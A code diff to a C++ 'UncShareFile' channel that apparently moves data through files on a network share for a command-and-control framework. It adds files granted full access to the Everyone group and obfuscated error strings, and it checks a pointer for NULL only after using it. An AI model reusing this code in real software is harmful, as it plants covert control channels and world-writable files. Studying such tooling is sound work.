@@ -1,9 +1,42 @@
 #include "StdAfx.h"
+#include "UncShareFile.h"
+#include "Common/MWR/Crypto/Base64.h"
+#include <Common/MWR/WinTools/UniqueHandle.h>
 #include <random>
 #include <fstream>
 #include <sstream>
-#include "UncShareFile.h"
-#include "Common/MWR/Crypto/Base64.h"
+#include <sddl.h>
+
+namespace
+{
+	BOOL CreateDACL(SECURITY_ATTRIBUTES* pSA)
+	{
+		pSA->nLength = sizeof(SECURITY_ATTRIBUTES);
+		pSA->bInheritHandle = true;
+
+		TCHAR* szSD = TEXT("D:(A;ID;FA;;;S-1-1-0)");
+
+		if (NULL == pSA)
+			return FALSE;
+
+		return ConvertStringSecurityDescriptorToSecurityDescriptor(
+			szSD,
+			SDDL_REVISION_1,
+			&(pSA->lpSecurityDescriptor),
+			NULL);
+	}
+
+	BOOL FreeDACL(SECURITY_ATTRIBUTES* pSA)
+	{
+		return NULL == LocalFree(pSA->lpSecurityDescriptor);
+	}
+
+	std::unique_ptr<SECURITY_ATTRIBUTES, std::function<void(SECURITY_ATTRIBUTES*)>> g_FullAccessDACL =
+	{
+		[]() {auto ptr = new SECURITY_ATTRIBUTES; CreateDACL(ptr); return ptr; }(),
+		[](SECURITY_ATTRIBUTES* ptr) {FreeDACL(ptr);  delete ptr; }
+	};
+}
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 MWR::C3::Interfaces::Channels::UncShareFile::UncShareFile(ByteView arguments)
@@ -38,6 +71,13 @@ size_t MWR::C3::Interfaces::Channels::UncShareFile::OnSendToChannel(ByteView dat
 		} while (std::filesystem::exists(filePath) or std::filesystem::exists(tmpFilePath));
 
 		{
+			// Create file with FullAccess to "Everyone" group
+			auto file = WinTools::UniqueHandle(CreateFileA(tmpFilePath.generic_string().c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, g_FullAccessDACL.get(), CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr));
+			if (file.get() == INVALID_HANDLE_VALUE)
+				throw std::runtime_error(OBF_STR("UncShareFile channel: failed to create a file ") + tmpFilePath.generic_string());
+		}
+		{
+			// Write the contents of a file
 			std::ofstream tmpFile(tmpFilePath, std::ios::trunc | std::ios::binary);
 			tmpFile << std::string_view{ data };
 		}
